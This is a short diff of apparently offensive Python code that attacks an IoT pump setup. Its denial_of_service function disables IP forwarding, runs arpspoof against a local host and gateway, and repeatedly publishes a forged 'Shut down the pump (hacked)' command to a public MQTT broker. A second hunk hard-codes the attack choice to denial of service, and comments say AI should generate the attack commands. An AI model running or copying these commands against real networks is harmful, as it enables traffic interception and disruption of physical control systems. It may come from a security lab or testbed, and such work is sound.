@@ -135,7 +135,7 @@ def denial_of_service():
         os.system("sudo sysctl -w net.ipv4.ip_forward=0") 
         #Reroutes packets from the MQTT server through this computer.
         #TODO: Have AI generate this command.
-        nodeAttack = subprocess.Popen(["sudo", "arpspoof", "-i", "eth0", "-t", "192.168.1.12", "192.168.1.1", ">", "garbage.txt"])
+        nodeAttack = subprocess.Popen(["sudo", "arpspoof", "-i", "eth0", "-t", "192.168.1.17", "192.168.1.1"])
         while True:
             #TODO: Have AI generate this command.
             os.system('mosquitto_pub -h mqtt.eclipseprojects.io -t attackMessage -m "Shut down the pump (hacked)"')
@@ -330,7 +330,7 @@ try:
         #lang_classification()
         if(rec):
             #response = lang_classification()
-            json_string = '{"attack_class_fdt": true, "attack_class_dos": false, "attack_class_phsh": false}'
+            json_string = '{"attack_class_fdt": false, "attack_class_dos": true, "attack_class_phsh": false}'
             response = json.loads(json_string)
             execute_attack(response)
             rec = False
